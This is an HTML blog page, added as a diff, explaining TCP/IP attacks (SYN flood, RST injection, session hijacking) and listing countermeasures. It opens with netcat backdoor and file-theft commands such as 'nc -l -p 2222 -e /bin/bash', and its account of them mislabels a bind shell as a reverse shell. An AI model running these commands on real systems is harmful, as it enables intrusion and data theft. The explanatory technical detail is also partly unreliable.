@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="blog_style.css">
+    <!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"></script> -->
+
+    
+    <title>TRE Blog</title>
+</head>
+<body>
+    <div class="blog-single gray-bg">
+        <div class="container">
+            <div class="row align-items-start">
+                <div class="col-lg-8 m-15px-tb">
+                    <article class="article">
+                        <div class="article-img">
+                            <img src="./AquaNature.jpg" title="" alt="">
+                        </div>
+                        <div class="article-title">
+                            <h6><a href="#">Cyber Security</a></h6>
+                            <h2>What is it about TCP/IP that invites attacks?</h2>
+                            <div class="media">
+                                <div class="avatar">
+                                    <img src="./RolandAvatar01.png" title="" alt="">
+                                </div>
+                                <div class="media-body">
+                                    <label>Hurricanemark</label>
+                                    <span>10 Mar 2023</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="article-content">
+                            <p>You opened an email attachment (exe or pdf) and inadvertently initiated a connection from your device to the attacker machine where his netcat is listening. A few bad things could happen in the execution of that embedded attachment you clicked. With enough finesse, the hacker creates a backdoor using netcat on your system that they can come back to at any time.</p>
+                            <br>
+                            <p>For example, hacker code could do the followings:</p>
+                            <div>     
+                                <ul>
+                                    <li>Create a backdoor if your system is Linux:</li>
+                                    <span>nc -l -p 2222 -e /bin/bash</span>
+
+                                    <li>Create a backdoor if your system is a windows:</li>
+                                    <span>nc -l -p 1337 -e hack.exe</span>
+
+                                    <li>Then, this will open a listener on your system (192.168.1.35) and pipe the command shell or the Linux bash shell to the hacker system.</li>
+                                    <span>nc 192.168.1.35 2222</span>
+
+                                    <li>To steal your file, the hacker will issue the following command from his computer.</li>
+                                    <span>nc -v -w 20 -p 8888 -l yourBankStatement.pdf</span>
+                                </ul>
+                            </div>
+                            <p>Heads up, your Windows Security has a setting 'Realtime protection' that will block this reverse shell attack. Make sure your computer has it enabled.</p>
+                            <br>
+                            <p>The Transmission Control Protocol (TCP) represents a special genre of vulnerabilities in protocol design and implementation. This socket framework is as old as slice bread. Security hardening often come as an add-in afterthought by wrapping it with a coat of armor.</p>
+                            <br>
+                            <p>TCP attacks range from TCP SYN flood attack, SYN cookies, Reset attack, Session hijacking to Reverse Shell exploit. Let's make sense of it all why we need counter measures.</p>
+                            <br>
+                            <ul>
+                                <li>TCP SYN flood attack exploits a vulnerability in the TCP/IP handshake in an attempt to disrupt a web service.  A SYN flood is a form of denial-of-service attack in which an attacker rapidly initiates a connection to a server without finalizing the connection. The server has to spend resources waiting for half-opened connections, which can consume enough resources to make the system unresponsive to legitimate traffic.</li><br>
+                                <li>An important aspect of the TCP protocol is that it supports having different flags on TCP packets, one of which is the “Reset” flag (“RST”). The idea behind this flag is that if a party on a TCP connection receives a TCP Reset packet from the other party, it will immediately close the connection. The hacker can disrupt legitimate connection by injecting TCP packet with RST flag to cause denial of service.</li><br>
+                                <li>Session hijacking, also known as cookie hijacking, is the exploitation of a valid computer session—sometimes also called a session key—to gain unauthorized access to information or services in a computer system. The goal of the TCP session hijacker is to create a state where the client and server are unable to exchange data (cutting in line and changing the destination of the packet to redirect traffic to the hacker's machine); This in turn enabling him/her to forge acceptable packets for both ends, mimicking the real packets. Thus, the attacker is able to gain control of the session.</li><br>
+                            </ul>
+                            <br>
+                            <h4>Counter Measures</h4>
+                            <ol>
+                                <li>Obviously, do not click on suspicious attachments.</li>
+                                <li>Encrypt session id will increase the complexity of the session id prediction.</li>
+                                <li>Send session id over SSL.</li>
+                                <li>Use switches rather than hubs.</li>
+                                <li>Ensure server side and client side protection software.</li>
+                                <li>Use IDS for detecting ARP spoofing/Poisoning.</li>
+                                <li>Use long random numbers for session id.</li>
+                                <li>Implement timeout for the session when the session is logged out, or session id expires.</li>
+                                <li>Have different session id for each page.</li>
+                                <li>Check the web application for all errors.</li>
+                                <li>Using IPSec is a valid defense mechanism.</li>
+                                <li>Use secure protocols instead of clear text protocols like HTTP, FTP, Telnet, Rlogin, etc.</li>
+                                <br>
+                            </ol>
+                            <h4>How do you know you have been hacked?</h4>
+                            <p>Unfortunately, TCP hack incidents could go unnoticed for a long time. AES LLC has got you covered with our enterprise analysis toolkit. CleverView for CTrace and CleverView for TCPIP.</p>
+
+                            
+                            <!-- <blockquote>
+                                <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam.</p>
+                                <p class="blockquote-footer">Someone famous in <cite title="Source Title">Dick Grayson</cite></p>
+                            </blockquote> -->
+                        </div>
+                        <!-- <div class="nav tag-cloud">
+                            <a href="#">Design</a>
+                            <a href="#">Development</a>
+                            <a href="#">Travel</a>
+                            <a href="#">Web Design</a>
+                            <a href="#">Marketing</a>
+                            <a href="#">Research</a>
+                            <a href="#">Managment</a>
+                        </div> -->
+                    </article>
+                    <div class="contact-form article-comment">
+                        <h4>Leave a Reply</h4>
+                        <form id="contact-form" method="POST">
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <div class="form-group">
+                                        <input name="Name" id="name" placeholder="Name *" class="form-control" type="text">
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="form-group">
+                                        <input name="Email" id="email" placeholder="Email *" class="form-control" type="email">
+                                    </div>
+                                </div>
+                                <div class="col-md-12">
+                                    <div class="form-group">
+                                        <textarea name="message" id="message" placeholder="Your message *" rows="4" class="form-control"></textarea>
+                                    </div>
+                                </div>
+                                <div class="col-md-12">
+                                    <div class="send">
+                                        <button class="px-btn theme"><span>Submit</span> <i class="arrow"></i></button>
+                                    </div>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+                <div class="col-lg-4 m-15px-tb blog-aside">
+                    <!-- Author -->
+                    <div class="widget widget-author">
+                        <div class="widget-title">
+                            <h3>Author</h3>
+                        </div>
+                        <div class="widget-body">
+                            <div class="media align-items-center">
+                                <div class="avatar">
+                                    <img src="https://bootdey.com/img/Content/avatar/avatar6.png" title="" alt="">
+                                </div>
+                                <div class="media-body">
+                                    <h6>Hello, I'm<br> Mark Nguyen</h6>
+                                </div>
+                            </div>
+                            <p>I develop free software and provide open source to help those who want to learn.  Human are welcome!</p>
+                        </div>
+                    </div>
+                    <!-- End Author -->
+                    <!-- Trending Post -->
+                    <!-- <div class="widget widget-post">
+                        <div class="widget-title">
+                            <h3>Trending Now</h3>
+                        </div>
+                        <div class="widget-body">
+
+                        </div>
+                    </div> -->
+                    <!-- End Trending Post -->
+                    <!-- Latest Post -->
+                    <div class="widget widget-latest-post">
+                        <div class="widget-title">
+                            <h3>Latest Post</h3>
+                        </div>
+                        <div class="widget-body">
+                            <div class="latest-post-aside media">
+                                <div class="lpa-left media-body">
+                                    <div class="lpa-title">
+                                        <h5><a target="_blank" href="https://hurricanemark.wixsite.com/techrolemi/post/implementing-an-algorithm-to-justify-multiple-lines-of-text">Implementing an algorithm to justify multiple lines of text</a></h5>
+                                    </div>
+                                    <div class="lpa-meta">
+                                        <a class="name" href="#">
+                                            Mark Nguyen
+                                        </a>
+                                        <a class="date" href="#">
+                                            Aug 13, 2022
+                                        </a>
+                                    </div>
+                                </div>
+                                <div class="lpa-right">
+                                    <a target="_blank"  href="https://rolemi.com">
+                                        <img src="./RolandAvatar01.png" title="" alt="">
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="latest-post-aside media">
+                                <div class="lpa-left media-body">
+                                    <div class="lpa-title">
+                                        <h5><a target="_blank"  href="https://hurricanemark.wixsite.com/techrolemi/post/possible-arrangements-in-a-n-by-n-matrix">Queens on neutral ground in a N-by-N matrix</a></h5>
+                                    </div>
+                                    <div class="lpa-meta">
+                                        <a class="name" href="#">
+                                            Mark Nguyen
+                                        </a>
+                                        <a class="date" href="#">
+                                            Oct 20, 2022
+                                        </a>
+                                    </div>
+                                </div>
+                                <div class="lpa-right">
+                                    <a target="_blank" href="https://rolemi.com">
+                                        <img src="./RolandAvatar01.png" title="" alt="">
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="latest-post-aside media">
+                                <div class="lpa-left media-body">
+                                    <div class="lpa-title">
+                                        <h5><a target="_blank" href="https://hurricanemark.wixsite.com/techrolemi/post/search-for-words-in-a-solved-scrabble-board">Search for words in a solved scrabble board</a></h5>
+                                    </div>
+                                    <div class="lpa-meta">
+                                        <a class="name" href="#">
+                                            Mark Nguyen
+                                        </a>
+                                        <a class="date" href="#">
+                                            Oct 20, 2022
+                                        </a>
+                                    </div>
+                                </div>
+                                <div class="lpa-right">
+                                    <a target="_blank" href="https://rolemi.com">
+                                        <img src="./RolandAvatar01.png" title="" alt="">
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- End Latest Post -->
+                    <!-- widget Tags -->
+                    <div class="widget widget-tags">
+                        <div class="widget-title">
+                            <h3>Latest Tags</h3>
+                        </div>
+                        <div class="widget-body">
+                            <div class="nav tag-cloud">
+                                <a href="#">Design</a>
+                                <a href="#">Development</a>
+                                <a href="#">Travel</a>
+                                <a href="#">Web Design</a>
+                                <a href="#">Marketing</a>
+                                <a href="#">Research</a>
+                                <a href="#">Managment</a>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- End widget Tags -->
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
